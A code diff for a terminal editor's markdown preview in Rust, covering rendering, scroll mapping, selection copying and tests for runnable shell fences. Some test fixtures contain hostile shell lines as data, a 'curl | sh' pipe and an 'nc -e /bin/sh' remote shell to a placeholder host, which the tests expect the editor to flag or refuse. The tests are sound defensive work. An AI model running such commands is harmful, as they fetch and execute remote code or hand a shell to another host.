+                    if let Some(rows) = r.table.as_mut() {
+                        rows.push(Vec::new());
+                    }
+                }
+                Tag::TableCell => {
+                    if let Some(rows) = r.table.as_mut()
+                        && let Some(row) = rows.last_mut()
+                    {
+                        row.push(String::new());
+                    }
+                }
+                _ => {}
+            },
+            Event::End(tag) => match tag {
+                TagEnd::Heading(_) => {
+                    // A repeated slug gets `-1`, `-2`, as GitHub numbers them.
+                    let base = heading_slug(&std::mem::take(&mut r.heading_text));
+                    let mut slug = base.clone();
+                    let mut n = 0;
+                    while r.links.headings.iter().any(|(s, _)| *s == slug) {
+                        n += 1;
+                        slug = format!("{base}-{n}");
+                    }
+                    r.links.headings.push((slug, block_line));
+                    r.flush_line();
+                    r.heading = None;
+                    r.out.push(Line::default());
+                }
+                TagEnd::Paragraph => {
+                    r.flush_line();
+                    if r.list_stack.is_empty() && r.quotes.is_empty() {
+                        r.out.push(Line::default());
+                    }
+                }
+                TagEnd::CodeBlock => r.end_code_block(),
+                TagEnd::List(_) => {
+                    r.flush_line();
+                    r.list_stack.pop();
+                    if r.list_stack.is_empty() {
+                        r.out.push(Line::default());
+                    }
+                }
+                TagEnd::Item => r.flush_line(),
+                TagEnd::BlockQuote(_) => {
+                    r.flush_line();
+                    r.quotes.pop();
+                    if r.quotes.is_empty() {
+                        r.out.push(Line::default());
+                    }
+                }
+                TagEnd::Emphasis => r.italic = r.italic.saturating_sub(1),
+                TagEnd::Strong => r.bold = r.bold.saturating_sub(1),
+                TagEnd::Strikethrough => r.strike = r.strike.saturating_sub(1),
+                TagEnd::Link => {
+                    r.link = r.link.saturating_sub(1);
+                    r.open_link = None;
+                    // A link that drew nothing (empty text, a table cell)
+                    // has nothing to click.
+                    if r.links.links.last().is_some_and(|l| l.spans.is_empty()) {
+                        r.links.links.pop();
+                    }
+                }
+                TagEnd::Image | TagEnd::MetadataBlock(_) => r.suppress_inline = false,
+                TagEnd::Table => r.end_table(),
+                _ => {}
+            },
+            Event::Text(text) => {
+                if r.suppress_inline {
+                } else if let Some((_, buf)) = r.code_block.as_mut() {
+                    buf.push_str(&text);
+                } else if let Some(rows) = r.table.as_mut() {
+                    if let Some(cell) = rows.last_mut().and_then(|row| row.last_mut()) {
+                        cell.push_str(&text);
+                    }
+                } else {
+                    if r.heading.is_some() {
+                        r.heading_text.push_str(&text);
+                    }
+                    let style = r.inline_style();
+                    r.push_text(&text, style);
+                }
+            }
+            Event::Code(code) => {
+                if r.suppress_inline {
+                } else if let Some(rows) = r.table.as_mut() {
+                    if let Some(cell) = rows.last_mut().and_then(|row| row.last_mut()) {
+                        cell.push_str(&code);
+                    }
+                } else {
+                    if r.heading.is_some() {
+                        r.heading_text.push_str(&code);
+                    }
+                    r.push_span(Span::styled(
+                        code.to_string(),
+                        Style::default().fg(theme.ui(CODE)),
+                    ));
+                }
+            }
+            Event::InlineMath(tex) => {
+                let text = crate::tex_text::to_unicode(&tex).replace('\n', " ");
+                if r.suppress_inline {
+                } else if let Some(rows) = r.table.as_mut() {
+                    if let Some(cell) = rows.last_mut().and_then(|row| row.last_mut()) {
+                        cell.push_str(&text);
+                    }
+                } else {
+                    let style = r.inline_style().add_modifier(Modifier::ITALIC);
+                    r.push_text(&text, style);
+                }
+            }
+            // A display block keeps its own lines, indented like a quote of
+            // the paragraph it sits in, one per `\\` row.
+            Event::DisplayMath(tex) => {
+                let text = crate::tex_text::to_unicode(&tex);
+                if r.suppress_inline {
+                } else if let Some(rows) = r.table.as_mut() {
+                    if let Some(cell) = rows.last_mut().and_then(|row| row.last_mut()) {
+                        cell.push_str(&text.replace('\n', " "));
+                    }
+                } else {
+                    r.flush_line();
+                    let style = Style::default()
+                        .fg(theme.ui(FG))
+                        .add_modifier(Modifier::ITALIC);
+                    for row in text.lines() {
+                        r.begin_content();
+                        r.cur.push(Span::raw(MATH_INDENT));
+                        r.cur.push(Span::styled(row.to_string(), style));
+                        r.flush_line();
+                    }
+                }
+            }
+            Event::SoftBreak => {
+                if !r.suppress_inline {
+                    let style = r.inline_style();
+                    r.push_text(" ", style);
+                }
+            }
+            Event::HardBreak => {
+                if !r.suppress_inline {
+                    r.flush_line();
+                }
+            }
+            Event::Rule => {
+                r.ensure_blank();
+                r.out.push(Line::from(Span::styled(
+                    "\u{2500}".repeat(RULE_COLS),
+                    Style::default().fg(theme.ui(DIM)),
+                )));
+                r.out.push(Line::default());
+            }
+            Event::TaskListMarker(checked) => {
+                r.pending_marker = Some(if checked {
+                    "\u{2611} ".to_string()
+                } else {
+                    "\u{2610} ".to_string()
+                });
+            }
+            _ => {}
+        }
+        if block_start {
+            let row = r.out.len() + usize::from(!r.cur.is_empty());
+            source_map.push((block_line, row));
+        }
+    }
+    r.flush_line();
+    // Trim the leading/trailing blank separators so the preview starts at
+    // the first real line - shifting the image anchors with the front
+    // trim, and never eating a trailing image's RESERVED blanks.
+    let reserved_end = r
+        .images
+        .iter()
+        .map(|i| i.first_line + i.rows as usize)
+        .max()
+        .unwrap_or(0);
+    source_map.append(&mut r.code_anchors);
+    source_map.sort_unstable();
+    let mut removed_front = 0usize;
+    // Runnables are anchored to a row exactly as images are, so the guard
+    // and the shift below have to cover both. They did not: a runnable's
+    // `first_line` survived the trim unshifted, so an empty leading block
+    // quote moved the fence up a row while the glyph's recorded row stayed
+    // put, and a preview click landed on the wrong line.
+    while r.out.first().is_some_and(|l| l.spans.is_empty())
+        && r.images
+            .first()
+            .is_none_or(|i| removed_front < i.first_line)
+        && r.runnables
+            .first()
+            .is_none_or(|b| removed_front < b.first_line)
+    {
+        r.out.remove(0);
+        removed_front += 1;
+    }
+    for img in &mut r.images {
+        img.first_line -= removed_front;
+    }
+    for anchor in &mut source_map {
+        anchor.1 = anchor.1.saturating_sub(removed_front);
+    }
+    for run in &mut r.runnables {
+        run.first_line -= removed_front;
+    }
+    for link in &mut r.links.links {
+        for span in &mut link.spans {
+            span.0 -= removed_front;
+        }
+    }
+    while r.out.len() > reserved_end.saturating_sub(removed_front)
+        && r.out.last().is_some_and(|l| l.spans.is_empty())
+    {
+        r.out.pop();
+    }
+    // Anchors must ascend in both coordinates for interpolation; a nested
+    // block that starts on its parent's line would repeat it, so keep the
+    // first of any run that does not advance.
+    source_map.dedup_by(|b, a| b.0 <= a.0 || b.1 < a.1);
+    (r.out, r.images, r.runnables, source_map, r.links)
+}
+
+impl MarkdownPreview {
+    /// The selection normalised to (start, end) in reading order.
+    fn ordered_selection(&self) -> Option<((u16, u16), (u16, u16))> {
+        let (a, b) = self.selection?;
+        // A click anchors head == anchor: that is a caret, not a
+        // selection. Treating it as one would tint a stray cell and let a
+        // plain click copy a character nobody selected.
+        if a == b {
+            return None;
+        }
+        Some(if (a.0, a.1) <= (b.0, b.1) {
+            (a, b)
+        } else {
+            (b, a)
+        })
+    }
+
+    /// True when cell (row, col) of the rendered view is selected. The
+    /// render pass paints these cells with the selection background.
+    pub fn cell_selected(&self, row: u16, col: u16) -> bool {
+        let Some((start, end)) = self.ordered_selection() else {
+            return false;
+        };
+        if row < start.0 || row > end.0 {
+            return false;
+        }
+        let from = if row == start.0 { start.1 } else { 0 };
+        let to = if row == end.0 { end.1 } else { u16::MAX };
+        col >= from && col <= to
+    }
+
+    /// The selected text of the rendered view, extracted from the rows the
+    /// last render recorded. Rows join with newlines, exactly as they read
+    /// on screen (VS Code copies the rendered text, not the source).
+    pub fn selection_text(&self) -> String {
+        let Some((start, end)) = self.ordered_selection() else {
+            return String::new();
+        };
+        let mut out: Vec<String> = Vec::new();
+        for row in start.0..=end.0 {
+            let Some(cells) = self.rows.get(row as usize) else {
+                continue;
+            };
+            let from = if row == start.0 {
+                (start.1 as usize).min(cells.len())
+            } else {
+                0
+            };
+            let to = if row == end.0 {
+                ((end.1 as usize) + 1).min(cells.len())
+            } else {
+                cells.len()
+            };
+            // Column-indexed: a wide glyph's continuation cell is empty and
+            // contributes nothing, so copied text keeps characters whole
+            // however the row is sliced.
+            out.push(if from <= to {
+                cells[from..to].concat().trim_end().to_string()
+            } else {
+                String::new()
+            });
+        }
+        // A single-row selection has no line break; multi-row keeps the
+        // visual line structure, trailing padding already trimmed.
+        out.join("\n").trim_end().to_string()
+    }
+
+    /// Whether anything is selected (drives the copy path and the
+    /// "clear selection" gestures).
+    pub fn has_selection(&self) -> bool {
+        self.ordered_selection().is_some()
+    }
+}
+
+/// The file a markdown image destination names under `base`, if it exists.
+/// A destination is a URL: `Screen%20Shot.png` is how CommonMark writes a
+/// space, and GitHub READMEs add `?raw=true`, so the query and fragment are
+/// dropped and escapes decoded. The literal spelling is tried first, for a
+/// file whose name really holds a `%`.
+fn local_image_path(base: &std::path::Path, dest: &str) -> Option<std::path::PathBuf> {
+    let literal = base.join(dest);
+    if literal.is_file() {
+        return Some(literal);
+    }
+    let bare = dest.split(['?', '#']).next().unwrap_or(dest);
+    let decoded = crate::shell_integration::percent_decode(bare.as_bytes());
+    let decoded = String::from_utf8(decoded).ok()?;
+    Some(base.join(decoded)).filter(|p| p.is_file())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn image_destinations_are_url_decoded_without_query_or_fragment() {
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::write(dir.path().join("Screen Shot.png"), b"x").unwrap();
+        std::fs::write(dir.path().join("100%.png"), b"x").unwrap();
+        let hit =
+            |d: &str| local_image_path(dir.path(), d).map(|p| p.file_name().unwrap().to_owned());
+        assert_eq!(hit("Screen%20Shot.png").unwrap(), "Screen Shot.png");
+        assert_eq!(
+            hit("Screen%20Shot.png?raw=true").unwrap(),
+            "Screen Shot.png"
+        );
+        assert_eq!(hit("Screen%20Shot.png#top").unwrap(), "Screen Shot.png");
+        assert_eq!(hit("100%.png").unwrap(), "100%.png");
+        assert!(hit("missing.png").is_none());
+    }
+
+    #[test]
+    fn scroll_sync_interpolates_rows_through_a_wrapped_paragraph() {
+        let rows = [0, 40, 41];
+        let mid = row_for_source(&[(0, 0), (11, 2)], &rows, 6).unwrap();
+        assert!(mid < 40, "inside the paragraph, got {mid}");
+        assert_eq!(
+            row_for_source(&[(0, 0), (2, 2)], &rows, 7),
+            Some(41),
+            "past the end clamps"
+        );
+    }
+
+    fn line_text(l: &Line) -> String {
+        l.spans.iter().map(|s| s.content.as_ref()).collect()
+    }
+
+    fn preview_rows(md: &str) -> Vec<String> {
+        let mut reg = LangRegistry::new();
+        let (lines, ..) =
+            render_markdown_mapped(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        lines.iter().map(line_text).collect()
+    }
+
+    /// The issue's file (#1564): inline math reads as symbols, and the
+    /// `$$` block keeps its own line without the markers.
+    #[test]
+    fn math_renders_as_symbols_and_display_math_keeps_its_line() {
+        let rows = preview_rows(
+            "# Math\n\nEuler: $e^{i\\pi} + 1 = 0$ inline.\n\n$$\n\\sum_{k=1}^{n} k = \\frac{n(n+1)}{2}\n$$\n\nDone.\n",
+        );
+        assert!(
+            rows.iter().any(|r| r == "Euler: e^(iπ) + 1 = 0 inline."),
+            "{rows:#?}"
+        );
+        let display = rows
+            .iter()
+            .find(|r| r.contains('∑'))
+            .expect("the display block is rendered");
+        assert_eq!(display, "    ∑ₖ₌₁ⁿ k = n(n+1)/2");
+        assert!(rows.iter().all(|r| !r.contains("$$") && !r.contains('\\')));
+        assert!(rows.iter().any(|r| r == "Done."));
+    }
+
+    #[test]
+    fn display_math_rows_stay_on_their_own_lines() {
+        let rows = preview_rows("$$\n\\begin{aligned}\na &= b \\\\\n  &= c\n\\end{aligned}\n$$\n");
+        let math: Vec<&str> = rows
+            .iter()
+            .map(String::as_str)
+            .filter(|r| !r.is_empty())
+            .collect();
+        assert_eq!(math, ["    a = b", "    = c"]);
+    }
+
+    #[test]
+    fn inline_math_is_italic_and_in_tables() {
+        let mut reg = LangRegistry::new();
+        let (lines, ..) = render_markdown_mapped(
+            "Area $\\pi r^2$.\n",
+            Theme::default(),
+            &mut reg,
+            None,
+            BlockOutputs::new(),
+        );
+        let span = lines[0]
+            .spans
+            .iter()
+            .find(|s| s.content == "π r²")
+            .expect("the math span");
+        assert!(span.style.add_modifier.contains(Modifier::ITALIC));
+        let rows = preview_rows("| f | value |\n|---|---|\n| area | $\\pi r^2$ |\n");
+        assert!(rows.iter().any(|r| r.contains("π r²")), "{rows:#?}");
+    }
+
+    /// Prices and shell variables are not math: an unclosed `$`, or one
+    /// closed after a space, stays as typed, and code keeps its TeX.
+    #[test]
+    fn dollars_that_are_not_math_stay_as_text() {
+        let rows = preview_rows(
+            "It costs $5 and $10 today.\n\nRun `echo $HOME $PATH`.\n\n```\n$x^2$\n```\n",
+        );
+        assert!(
+            rows.iter().any(|r| r == "It costs $5 and $10 today."),
+            "{rows:#?}"
+        );
+        assert!(
+            rows.iter().any(|r| r.contains("echo $HOME $PATH")),
+            "{rows:#?}"
+        );
+        assert!(rows.iter().any(|r| r.contains("$x^2$")), "{rows:#?}");
+    }
+
+    #[test]
+    fn the_source_map_lands_each_block_on_its_rendered_line() {
+        let md = "# Title\n\nfirst para\n\n```\na\nb\nc\n```\n\n## Next\n\nlast para\n";
+        let mut reg = LangRegistry::new();
+        let (lines, _, _, map, _) =
+            render_markdown_mapped(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        for (src, needle) in [
+            (0, "Title"),
+            (2, "first para"),
+            (10, "Next"),
+            (12, "last para"),
+        ] {
+            let built = built_line_for_source(&map, src).expect("mapped");
+            assert!(
+                line_text(&lines[built]).contains(needle),
+                "source line {src} should land on {needle:?}, got {:?}",
+                line_text(&lines[built])
+            );
+            assert_eq!(source_line_for_built(&map, built), Some(src), "and back");
+        }
+    }
+
+    /// #1386: an alert's marker line lands on its title row, not the body.
+    #[test]
+    fn an_alert_marker_line_maps_to_its_title_row() {
+        let md = "intro\n\n> [!NOTE]\n> body\n\nafter\n";
+        let mut reg = LangRegistry::new();
+        let (lines, _, _, map, _) =
+            render_markdown_mapped(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        for (src, needle) in [(2, "Note"), (3, "body"), (5, "after")] {
+            let built = built_line_for_source(&map, src).expect("mapped");
+            assert!(
+                line_text(&lines[built]).contains(needle),
+                "source line {src} should land on {needle:?}, got {:?}",
+                line_text(&lines[built])
+            );
+        }
+        // An alert opening a later list item: the item's own anchor for that
+        // line sat on the blank row above the title.
+        let md = "- one\n- > [!TIP]\n  > body\n";
+        let (lines, _, _, map, _) =
+            render_markdown_mapped(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        let built = built_line_for_source(&map, 1).expect("mapped");
+        assert!(
+            line_text(&lines[built]).contains("Tip"),
+            "got {:?}",
+            line_text(&lines[built])
+        );
+    }
+
+    #[test]
+    fn a_line_inside_a_run_fence_maps_to_its_code_not_the_output_box() {
+        let md = "```sh\necho a\necho b\necho c\n```\n\nafter\n";
+        let mut outputs = BlockOutputs::new();
+        outputs.insert(
+            0,
+            BlockOutput {
+                text: (1..=10).map(|i| format!("out{i}\n")).collect(),
+                exit: Some(0),
+                timed_out: false,
+            },
+        );
+        let mut reg = LangRegistry::new();
+        let (lines, _, _, map, _) =
+            render_markdown_mapped(md, Theme::default(), &mut reg, None, outputs);
+        for (src, needle) in [(1, "echo a"), (2, "echo b"), (3, "echo c"), (6, "after")] {
+            let built = built_line_for_source(&map, src).expect("mapped");
+            assert!(
+                line_text(&lines[built]).contains(needle),
+                "source line {src} should land on {needle:?}, got {:?}",
+                line_text(&lines[built])
+            );
+        }
+    }
+
+    #[test]
+    fn interpolation_is_exact_at_anchors_linear_between_and_clamped() {
+        let map = vec![(0, 0), (10, 20)];
+        assert_eq!(built_line_for_source(&map, 0), Some(0));
+        assert_eq!(built_line_for_source(&map, 5), Some(10));
+        assert_eq!(built_line_for_source(&map, 12), Some(22), "past the end");
+        assert_eq!(source_line_for_built(&map, 10), Some(5));
+        assert_eq!(built_line_for_source(&[], 3), None);
+    }
+
+    fn render(text: &str) -> Vec<Line<'static>> {
+        render_markdown(text, Theme::default(), &mut LangRegistry::new())
+    }
+
+    fn text_of(line: &Line) -> String {
+        line.spans.iter().map(|s| s.content.as_ref()).collect()
+    }
+
+    #[test]
+    fn local_images_reserve_anchored_rows_and_urls_stay_placeholders() {
+        let tmp = tempfile::tempdir().unwrap();
+        image::RgbaImage::new(100, 50)
+            .save(tmp.path().join("pic.png"))
+            .unwrap();
+        let text = "# Title\n\n![local](pic.png)\n\n![remote](https://x/y.png)\n\n![gone](nope.png)\n\ntail";
+        let mut reg = crate::highlight::LangRegistry::default();
+        let (lines, images) =
+            super::render_markdown_with_images(text, Theme::BLACK, &mut reg, Some(tmp.path()));
+        assert_eq!(images.len(), 1, "only the local existing image reserves");
+        let img = &images[0];
+        assert!(img.path.ends_with("pic.png"));
+        // 100x50 at the 72-col budget: (50/100)*72/2 = 18 rows.
+        assert_eq!(img.rows, 18);
+        for i in 0..img.rows as usize {
+            assert!(
+                lines[img.first_line + i].spans.is_empty(),
+                "reserved line {i} must be blank"
+            );
+        }
+        let all = all_text(&lines);
+        assert!(all.contains("https://x/y.png"), "URL keeps the placeholder");
+        assert!(
+            all.contains("nope.png"),
+            "missing file keeps the placeholder"
+        );
+        assert!(all.contains("tail"));
+    }
+
+    #[test]
+    fn reserved_image_alt_text_is_suppressed_but_placeholder_alt_survives() {
+        // #196 review: pulldown-cmark emits the alt content between the
+        // image tag pair; a reserved image must swallow it, a
+        // placeholder keeps its label.
+        let tmp = tempfile::tempdir().unwrap();
+        image::RgbaImage::new(10, 10)
+            .save(tmp.path().join("p.png"))
+            .unwrap();
+        let text = "![the alt words](p.png)\n\n![web alt](https://x/y.png)";
+        let mut reg = crate::highlight::LangRegistry::default();
+        let (lines, images) =
+            super::render_markdown_with_images(text, Theme::BLACK, &mut reg, Some(tmp.path()));
+        assert_eq!(images.len(), 1);
+        let all = all_text(&lines);
+        assert!(
+            !all.contains("the alt words"),
+            "reserved image swallows its alt: {all}"
+        );
+        assert!(all.contains("web alt"), "placeholder keeps its alt");
+    }
+
+    #[test]
+    fn a_leading_image_survives_the_blank_trim_with_true_anchors() {
+        let tmp = tempfile::tempdir().unwrap();
+        image::RgbaImage::new(100, 200)
+            .save(tmp.path().join("tall.png"))
+            .unwrap();
+        let text = "![t](tall.png)";
+        let mut reg = crate::highlight::LangRegistry::default();
+        let (lines, images) =
+            super::render_markdown_with_images(text, Theme::BLACK, &mut reg, Some(tmp.path()));
+        assert_eq!(images.len(), 1);
+        assert_eq!(images[0].first_line, 0, "front trim shifted the anchor");
+        assert_eq!(images[0].rows, 18, "tall image clamps at 18");
+        assert!(
+            lines.len() >= images[0].rows as usize,
+            "the tail trim must not eat reserved rows: {} lines",
+            lines.len()
+        );
+    }
+
+    fn all_text(lines: &[Line]) -> String {
+        lines.iter().map(text_of).collect::<Vec<_>>().join("\n")
+    }
+
+    #[test]
+    fn heading_is_bold_and_separated_from_the_paragraph() {
+        let lines = render("# Title\n\nBody text here.");
+        assert_eq!(text_of(&lines[0]), "Title");
+        assert!(
+            lines[0].spans[0]
+                .style
+                .add_modifier
+                .contains(Modifier::BOLD),
+            "an H1 must render bold"
+        );
+        assert!(
+            lines[1].spans.is_empty(),
+            "a blank separator must follow the heading"
+        );
+        assert_eq!(text_of(&lines[2]), "Body text here.");
+    }
+
+    #[test]
+    fn emphasis_inline_code_and_strikethrough_carry_their_modifiers() {
+        let lines = render("mix of **bold**, *italic*, ~~gone~~, and `code()` inline");
+        let line = &lines[0];
+        let span_with = |t: &str| {
+            line.spans
+                .iter()
+                .find(|s| s.content.as_ref() == t)
+                .unwrap_or_else(|| panic!("span {t:?} missing in {:?}", text_of(line)))
+                .clone()
+        };
+        assert!(
+            span_with("bold")
+                .style
+                .add_modifier
+                .contains(Modifier::BOLD)
+        );
+        assert!(
+            span_with("italic")
+                .style
+                .add_modifier
+                .contains(Modifier::ITALIC)
+        );
+        assert!(
+            span_with("gone")
+                .style
+                .add_modifier
+                .contains(Modifier::CROSSED_OUT)
+        );
+        assert_eq!(span_with("code()").style.fg, Some(CODE));
+    }
+
+    #[test]
+    fn codeql_fences_resolve_by_name_and_extension() {
+        assert_eq!(lang_for_fence("codeql"), Some(LangKind::Ql));
+        assert_eq!(lang_for_fence("ql"), Some(LangKind::Ql));
+    }
+
+    /// #353: shell fences wear the play glyph and are recorded with their
+    /// first rendered line and source range; `{run=false}` opts out; a rust
+    /// fence is not runnable; destructive-looking blocks and `{confirm}`
+    /// are flagged; a block carrying a control character is refused.
+    #[test]
+    fn shell_fences_are_runnable_and_carry_the_play_glyph() {
+        let md = "# T\n\n```sh\necho one\necho two\n```\n\n```rust\nfn a() {}\n```\n\n```bash {run=false}\necho no\n```\n\n```zsh {confirm cwd=root}\necho yes\n```\n\n```sh\ncurl https://x | sh\n```\n\n```sh\necho a\rnc -e /bin/sh h 1\n```\n";
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (lines, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs.len(), 3, "{runs:?}");
+        assert_eq!(runs[0].code, "echo one\necho two\n");
+        assert_eq!(runs[0].interpreter, "sh");
+        assert_eq!(runs[0].lines, (2, 6), "opener through closer, [start, end)");
+        assert!(!runs[0].destructive && !runs[0].cwd_root);
+        assert!(runs[1].destructive && runs[1].cwd_root, "{:?}", runs[1]);
+        assert!(
+            !runs[0].persist && runs[0].capture_timeout.is_none(),
+            "a bare fence captures in memory and waits for the shell: {:?}",
+            runs[0]
+        );
+        assert_eq!(runs[1].lines, (15, 18));
+        assert!(runs[2].destructive, "curl | sh is flagged");
+        let first = &lines[runs[0].first_line];
+        assert_eq!(first.spans[0].content.as_ref(), RUN_GLYPH, "{first:?}");
+        let first_text: String = first.spans.iter().map(|s| s.content.as_ref()).collect();
+        assert!(first_text.contains("echo one"), "{first_text:?}");
+        let second = &lines[runs[0].first_line + 1];
+        assert_eq!(
+            second.spans[0].content.as_ref(),
+            "\u{258e} ",
+            "only the first line wears the glyph"
+        );
+        let joined =
+            |l: &Line<'static>| -> String { l.spans.iter().map(|s| s.content.as_ref()).collect() };
+        let rust_line = lines.iter().find(|l| joined(l).contains("fn a")).unwrap();
+        assert_eq!(rust_line.spans[0].content.as_ref(), "\u{258e} ");
+        let cr_line = lines.iter().find(|l| joined(l).contains("nc -e")).unwrap();
+        assert_eq!(
+            cr_line.spans[0].content.as_ref(),
+            "\u{258e} ",
+            "a block with a carriage return is not runnable"
+        );
+        assert_eq!(runnable_interpreter("sh {run=false}"), None);
+        assert_eq!(runnable_interpreter("console"), Some("sh"));
+        assert_eq!(runnable_interpreter("toml"), None);
+        assert!(has_control_chars("echo a\rb"));
+        assert!(has_control_chars("echo \x1b[2J"));
+        assert!(!has_control_chars("echo a\n\tb\n"));
+        assert!(
+            has_control_chars("echo hi \u{202E}~ fr- mr"),
+            "a bidi override"
+        );
+        assert!(has_control_chars("rm\u{200B} -rf"), "a zero-width space");
+        assert!(has_control_chars("\u{FEFF}echo"), "a BOM");
+        assert!(
+            !has_control_chars("echo 日本語 café"),
+            "ordinary Unicode is fine"
+        );
+        // A fence inside a list item: the source range still spans the
+        // opener through the closer, indented or not.
+        let nested = "1. First:\n\n   ```sh\n   echo nested\n   ```\n\n2. Done\n";
+        let (_, _, runs) = render_markdown_full(
+            nested,
+            Theme::default(),
+            &mut reg,
+            None,
+            BlockOutputs::new(),
+        );
+        assert_eq!(runs.len(), 1, "{runs:?}");
+        assert_eq!(runs[0].lines, (2, 5));
+        assert_eq!(runs[0].code.trim(), "echo nested");
+        // An unterminated fence at EOF still gets a range.
+        let open = "```sh\necho hi\n";
+        let (_, _, runs) =
+            render_markdown_full(open, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert_eq!(runs.len(), 1);
+        assert_eq!(runs[0].lines.0, 0);
+        assert!(runs[0].lines.1 >= 2, "{:?}", runs[0].lines);
+        // A whitespace-only fence wears no glyph.
+        let blank = "```sh\n   \n```\n";
+        let (_, _, runs) =
+            render_markdown_full(blank, Theme::default(), &mut reg, None, BlockOutputs::new());
+        assert!(runs.is_empty());
+    }
+
+    /// The commands a fence would run, by fence, in order.
+    fn run_codes(md: &str) -> Vec<String> {
+        let mut reg = crate::highlight::LangRegistry::new();
+        let (_, _, runs) =
+            render_markdown_full(md, Theme::default(), &mut reg, None, BlockOutputs::new());
+        runs.into_iter().map(|r| r.code).collect()
+    }
+
+    /// #1473: a `console` fence is a shell-session transcript. Only its
+    /// prompt lines run, without the `$ `; its sample output never does.
+    #[test]
+    fn a_console_fence_runs_its_prompt_lines_and_not_its_output() {
+        let md = "```console\n$ echo installed-ok\ninstalled-ok\n$ ls -1 /tmp/rd\nREADME.md\n```\n";
+        assert_eq!(run_codes(md), vec!["echo installed-ok\nls -1 /tmp/rd\n"]);
+        // The other transcript names, and a root `# ` prompt.
+        for lang in [
+            "shell-session",
+            "sh-session",
+            "shellsession",
+            "bash-session",
+        ] {
+            let md = format!("```{lang}\n$ make\nok\n```\n");
+            assert_eq!(run_codes(&md), vec!["make\n"], "{lang}");
+        }
+        let root = "```console\n# apt-get install -y jq\nReading package lists...\n```\n";
+        assert_eq!(run_codes(root), vec!["apt-get install -y jq\n"]);
+        // A bare `$` prompt line is an empty command, not `$`.
+        let bare = "```console\n$\n$ pwd\n/home/me\n```\n";
+        assert_eq!(run_codes(bare), vec!["pwd\n"]);
+    }
+
+    /// #1473: beside `$ ` prompts a `# ` line is a comment, not a root
+    /// prompt, so it never runs, and an apostrophe in it opens no quote
+    /// that would swallow the commands after it.
+    #[test]
+    fn a_comment_beside_user_prompts_in_a_console_fence_never_runs() {
+        let md = "```console\n# Install the dependencies\n$ npm install\nadded 1 package\n\
+                  # Don't forget the build\n$ npm run build\n```\n";
+        assert_eq!(run_codes(md), vec!["npm install\nnpm run build\n"]);
+    }
+
+    /// #1473: a command continued onto the next lines keeps them, whether
+    /// the transcript shows the shell's `> ` continuation prompt or not.
+    #[test]
+    fn a_console_fence_keeps_a_command_continued_over_several_lines() {
+        let slash = "```console\n$ cargo build \\\n    --release\n   Compiling x\n```\n";
+        assert_eq!(run_codes(slash), vec!["cargo build \\\n    --release\n"]);
+        let ps2 = "```console\n$ echo 'one\n> two'\none\ntwo\n```\n";
+        assert_eq!(run_codes(ps2), vec!["echo 'one\ntwo'\n"]);
+        let pipe = "```console\n$ ls |\n> wc -l\n3\n```\n";
+        assert_eq!(run_codes(pipe), vec!["ls |\nwc -l\n"]);
+        let heredoc = "```console\n$ cat <<EOF > a.txt\n> hi\n> EOF\n$ cat a.txt\nhi\n```\n";
+        assert_eq!(
+            run_codes(heredoc),
+            vec!["cat <<EOF > a.txt\nhi\nEOF\ncat a.txt\n"]
+        );
+    }
+
+    /// #1473 negative: output that starts with `> ` after a finished
+    /// command is output (npm prints `> pkg@1.0.0 build`), not more command.
+    #[test]
+    fn output_starting_with_a_ps2_mark_after_a_finished_command_is_output() {
+        let md = "```console\n$ npm run build\n\n> demo@1.0.0 build\n> tsc\n\n$ npm test\n```\n";
+        assert_eq!(run_codes(md), vec!["npm run build\nnpm test\n"]);
+    }
+
+    /// #1473 negative: a `<<` the shell would not read (quoted, escaped,
+    /// in a comment, or a `<<<` here-string) opens no heredoc, so `> `
+    /// sample output after it never runs.
+    #[test]
+    fn a_quoted_or_commented_heredoc_marker_does_not_run_the_output() {
+        for cmd in [
+            "printf '%s\\n' '<<EOF'",
+            "echo \"<<EOF\"",
+            "echo \\<<EOF",
+            "ls # <<EOF",
+            "cat <<< EOF",
+        ] {
+            let md = format!("```console\n$ {cmd}\n> touch /tmp/x\n> EOF\n```\n");
+            assert_eq!(run_codes(&md), vec![format!("{cmd}\n")], "{cmd}");
+        }
+        // A `<<` inside a quote a previous line opened is quoted too.
+        let md = "```console\n$ echo 'a\n> <<EOF'\n> touch /tmp/x\n```\n";
+        assert_eq!(run_codes(md), vec!["echo 'a\n<<EOF'\n"]);
+    }
+
+    /// #1473: a heredoc body written without `> ` is kept, raw, up to its
+    /// delimiter; `<<-` lets the delimiter be tab-indented and a quoted
+    /// delimiter is the word inside the quotes.
+    #[test]
+    fn a_heredoc_body_without_continuation_prompts_is_kept() {
+        let md = "```console\n$ cat <<EOF\nhello\n$ not-a-prompt\nEOF\n$ ls\nout\n```\n";
+        assert_eq!(
+            run_codes(md),
+            vec!["cat <<EOF\nhello\n$ not-a-prompt\nEOF\nls\n"]
+        );
+        let tabs = "```console\n$ cat <<-'END'\n\thi\n\tEND\nout\n```\n";
+        assert_eq!(run_codes(tabs), vec!["cat <<-'END'\n\thi\n\tEND\n"]);
+        // Without `-` a tab-indented word is body, not the delimiter.
+        let plain = "```console\n$ cat <<\"END\"\n\tEND\nEND\nout\n```\n";
+        assert_eq!(run_codes(plain), vec!["cat <<\"END\"\n\tEND\nEND\n"]);
+    }
+
+    /// #1473: a shell fence written as a transcript (it opens with a
+    /// `$ ` prompt, which no real script does) runs the same way.
+    #[test]
+    fn a_shell_fence_written_as_a_transcript_runs_its_prompt_lines() {
+        let md = "```bash\n$ npm install\nadded 1 package\n$ npm start\n```\n";
+        assert_eq!(run_codes(md), vec!["npm install\nnpm start\n"]);
+        let sh = "```sh\n\n$ make test\n```\n";
+        assert_eq!(run_codes(sh), vec!["make test\n"]);
+    }
+
+    /// #1473 negative: an ordinary shell script is typed as written: a
+    /// `# ` comment is not a root prompt, `$HOME` and `$(...)` are not
+    /// prompts, and nothing is dropped.
+    #[test]
+    fn an_ordinary_shell_fence_is_unchanged() {
+        let md = "```bash\n# install deps\nnpm install\necho done\n```\n";
+        assert_eq!(
+            run_codes(md),
+            vec!["# install deps\nnpm install\necho done\n"]
+        );
